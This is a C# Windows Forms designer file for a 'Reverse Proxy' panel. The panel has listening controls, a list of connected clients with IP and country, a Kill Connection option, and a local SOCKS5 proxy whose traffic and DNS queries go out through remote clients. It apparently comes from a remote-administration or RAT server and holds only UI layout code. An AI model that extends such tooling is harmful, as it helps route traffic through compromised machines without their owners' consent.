using System;
using System.ComponentModel;
using System.Drawing;
using System.Windows.Forms;
using InvokedServer.Controls;
using InvokedServer.Utilities;

namespace InvokedServer.Forms
{
    partial class FrmReverseProxy
    {
        private IContainer components;

        protected override void Dispose(bool disposing)
        {
            if (disposing && this.components != null)
                this.components.Dispose();
            base.Dispose(disposing);
        }

        private void InitializeComponent()
        {
            this.components = (IContainer)new System.ComponentModel.Container();
            ListViewColumnSorter viewColumnSorter = new ListViewColumnSorter();
            ComponentResourceManager resources = new ComponentResourceManager(typeof(FrmReverseProxy));
            this.btnStart = new Button();
            this.lblLocalServerPort = new Label();
            this.nudServerPort = new NumericUpDown();
            this.tabCtrl = new TabControl();
            this.tabPage1 = new TabPage();
            this.lstConnections = new AeroListView();
            this.columnHeader6 = new ColumnHeader();
            this.columnHeader7 = new ColumnHeader();
            this.columnHeader1 = new ColumnHeader();
            this.columnHeader2 = new ColumnHeader();
            this.columnHeader3 = new ColumnHeader();
            this.columnHeader4 = new ColumnHeader();
            this.columnHeader5 = new ColumnHeader();
            this.contextMenuStrip = new ContextMenuStrip(this.components);
            this.killConnectionToolStripMenuItem = new ToolStripMenuItem();
            this.btnStop = new Button();
            this.lblProxyInfo = new Label();
            this.label1 = new Label();
            this.lblLoadBalance = new Label();
            this.nudServerPort.BeginInit();
            this.tabCtrl.SuspendLayout();
            this.tabPage1.SuspendLayout();
            this.contextMenuStrip.SuspendLayout();
            this.SuspendLayout();
            this.btnStart.Location = new Point(243, 12);
            this.btnStart.Name = "btnStart";
            this.btnStart.Size = new Size(114, 23);
            this.btnStart.TabIndex = 0;
            this.btnStart.Text = "Start Listening";
            this.btnStart.UseVisualStyleBackColor = true;
            this.btnStart.Click += new EventHandler(this.btnStart_Click);
            this.lblLocalServerPort.AutoSize = true;
            this.lblLocalServerPort.Location = new Point(22, 17);
            this.lblLocalServerPort.Name = "lblLocalServerPort";
            this.lblLocalServerPort.Size = new Size(91, 13);
            this.lblLocalServerPort.TabIndex = 1;
            this.lblLocalServerPort.Text = "Local Server Port";
            this.nudServerPort.Location = new Point(117, 15);
            this.nudServerPort.Maximum = new Decimal(new int[4]
            {
        65534,
        0,
        0,
        0
            });
            this.nudServerPort.Minimum = new Decimal(new int[4]
            {
        1,
        0,
        0,
        0
            });
            this.nudServerPort.Name = "nudServerPort";
            this.nudServerPort.Size = new Size(120, 22);
            this.nudServerPort.TabIndex = 2;
            this.nudServerPort.TextAlign = HorizontalAlignment.Center;
            this.nudServerPort.Value = new Decimal(new int[4]
            {
        3128,
        0,
        0,
        0
            });
            this.nudServerPort.ValueChanged += new EventHandler(this.nudServerPort_ValueChanged);
            this.tabCtrl.Anchor = AnchorStyles.Top | AnchorStyles.Bottom | AnchorStyles.Left | AnchorStyles.Right;
            this.tabCtrl.Controls.Add((Control)this.tabPage1);
            this.tabCtrl.Location = new Point(26, 115);
            this.tabCtrl.Name = "tabCtrl";
            this.tabCtrl.SelectedIndex = 0;
            this.tabCtrl.Size = new Size(736, 274);
            this.tabCtrl.TabIndex = 3;
            this.tabPage1.Controls.Add((Control)this.lstConnections);
            this.tabPage1.Location = new Point(4, 22);
            this.tabPage1.Name = "tabPage1";
            this.tabPage1.Padding = new Padding(3);
            this.tabPage1.Size = new Size(728, 248);
            this.tabPage1.TabIndex = 0;
            this.tabPage1.Text = "Open Connections";
            this.tabPage1.UseVisualStyleBackColor = true;
            this.lstConnections.Columns.AddRange(new ColumnHeader[7]
            {
        this.columnHeader6,
        this.columnHeader7,
        this.columnHeader1,
        this.columnHeader2,
        this.columnHeader3,
        this.columnHeader4,
        this.columnHeader5
            });
            this.lstConnections.ContextMenuStrip = this.contextMenuStrip;
            this.lstConnections.Dock = DockStyle.Fill;
            this.lstConnections.FullRowSelect = true;
            this.lstConnections.GridLines = true;
            this.lstConnections.HideSelection = false;
            this.lstConnections.Location = new Point(3, 3);
            viewColumnSorter.NeedNumberCompare = false;
            viewColumnSorter.Order = SortOrder.None;
            viewColumnSorter.SortColumn = 0;
            this.lstConnections.LvwColumnSorter = viewColumnSorter;
            this.lstConnections.Name = "lstConnections";
            this.lstConnections.Size = new Size(722, 242);
            this.lstConnections.TabIndex = 0;
            this.lstConnections.UseCompatibleStateImageBehavior = false;
            this.lstConnections.View = View.Details;
            this.lstConnections.VirtualMode = true;
            this.lstConnections.RetrieveVirtualItem += new RetrieveVirtualItemEventHandler(this.LvConnections_RetrieveVirtualItem);
            this.columnHeader6.Text = "Client IP";
            this.columnHeader6.Width = 106;
            this.columnHeader7.Text = "Client Country";
            this.columnHeader7.Width = 106;
            this.columnHeader1.Text = "Target Server";
            this.columnHeader1.Width = 135;
            this.columnHeader2.Text = "Target Port";
            this.columnHeader2.Width = 68;
            this.columnHeader3.Text = "Total Received";
            this.columnHeader3.Width = 105;
            this.columnHeader4.Text = "Total Sent";
            this.columnHeader4.Width = 95;
            this.columnHeader5.Text = "Proxy Type";
            this.columnHeader5.Width = 90;
            this.contextMenuStrip.Items.AddRange(new ToolStripItem[1]
            {
        (ToolStripItem) this.killConnectionToolStripMenuItem
            });
            this.contextMenuStrip.Name = "contextMenuStrip1";
            this.contextMenuStrip.Size = new Size(156, 26);
            this.killConnectionToolStripMenuItem.Name = "killConnectionToolStripMenuItem";
            this.killConnectionToolStripMenuItem.Size = new Size(155, 22);
            this.killConnectionToolStripMenuItem.Text = "Kill Connection";
            this.killConnectionToolStripMenuItem.Click += new EventHandler(this.killConnectionToolStripMenuItem_Click);
            this.btnStop.Enabled = false;
            this.btnStop.Location = new Point(363, 12);
            this.btnStop.Name = "btnStop";
            this.btnStop.Size = new Size(114, 23);
            this.btnStop.TabIndex = 4;
            this.btnStop.Text = "Stop Listening";
            this.btnStop.UseVisualStyleBackColor = true;
            this.btnStop.Click += new EventHandler(this.btnStop_Click);
            this.lblProxyInfo.AutoSize = true;
            this.lblProxyInfo.Location = new Point(23, 51);
            this.lblProxyInfo.Name = "lblProxyInfo";
            this.lblProxyInfo.Size = new Size(312, 13);
            this.lblProxyInfo.TabIndex = 5;
            this.lblProxyInfo.Text = "Connect to this SOCKS5 Proxy: 127.0.0.1:3128 (no user/pass)";
            this.label1.AutoSize = true;
            this.label1.Location = new Point(23, 67);
            this.label1.Name = "label1";
            this.label1.Size = new Size(404, 13);
            this.label1.TabIndex = 6;
            this.label1.Text = "All the DNS Queries will be executed at the remote client to reduce DNS Leaks";
            this.lblLoadBalance.AutoSize = true;
            this.lblLoadBalance.Location = new Point(23, 84);
            this.lblLoadBalance.Name = "lblLoadBalance";
            this.lblLoadBalance.Size = new Size(104, 13);
            this.lblLoadBalance.TabIndex = 7;
            this.lblLoadBalance.Text = "[Load Balance Info]";
            this.AutoScaleDimensions = new SizeF(96f, 96f);
            this.AutoScaleMode = AutoScaleMode.Dpi;
            this.ClientSize = new Size(777, 402);
            this.Controls.Add((Control)this.lblLoadBalance);
            this.Controls.Add((Control)this.label1);
            this.Controls.Add((Control)this.lblProxyInfo);
            this.Controls.Add((Control)this.btnStop);
            this.Controls.Add((Control)this.tabCtrl);
            this.Controls.Add((Control)this.nudServerPort);
            this.Controls.Add((Control)this.lblLocalServerPort);
            this.Controls.Add((Control)this.btnStart);
            this.Font = new Font("Segoe UI", 8.25f, FontStyle.Regular, GraphicsUnit.Point, (byte)0);
            this.Icon = (Icon)resources.GetObject("$this.Icon");
            this.Name = "FrmReverseProxy";
            this.StartPosition = FormStartPosition.CenterScreen;
            this.Text = "Reverse Proxy []";
            this.FormClosing += new FormClosingEventHandler(this.FrmReverseProxy_FormClosing);
            this.Load += new EventHandler(this.FrmReverseProxy_Load);
            this.nudServerPort.EndInit();
            this.tabCtrl.ResumeLayout(false);
            this.tabPage1.ResumeLayout(false);
            this.contextMenuStrip.ResumeLayout(false);
            this.ResumeLayout(false);
            this.PerformLayout();
        }

        private Button btnStart;
        private Label lblLocalServerPort;
        private NumericUpDown nudServerPort;
        private TabControl tabCtrl;
        private TabPage tabPage1;
        private AeroListView lstConnections;
        private ColumnHeader columnHeader1;
        private ColumnHeader columnHeader2;
        private ColumnHeader columnHeader3;
        private ColumnHeader columnHeader4;
        private ColumnHeader columnHeader5;
        private Button btnStop;
        private Label lblProxyInfo;
        private ContextMenuStrip contextMenuStrip;
        private ToolStripMenuItem killConnectionToolStripMenuItem;
        private ColumnHeader columnHeader6;
        private ColumnHeader columnHeader7;
        private Label label1;
        private Label lblLoadBalance;
    }
}
